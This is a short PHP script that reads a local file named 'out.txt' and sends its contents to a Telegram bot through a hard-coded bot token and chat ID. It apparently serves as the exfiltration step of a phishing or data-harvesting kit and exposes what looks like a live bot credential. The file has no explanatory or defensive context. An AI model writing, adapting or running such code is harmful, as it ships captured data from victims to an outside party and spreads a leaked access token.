<?php
    sleep(2);
    $msg = urlencode(file_get_contents("out.txt"));
    file_get_contents("https://api.telegram.org/bot8223992925:AAE8R0yTj540UaQ1duMOPpfC7PsC3Z-j5os/sendMessage?chat_id=1196450049&text=$msg");
?>
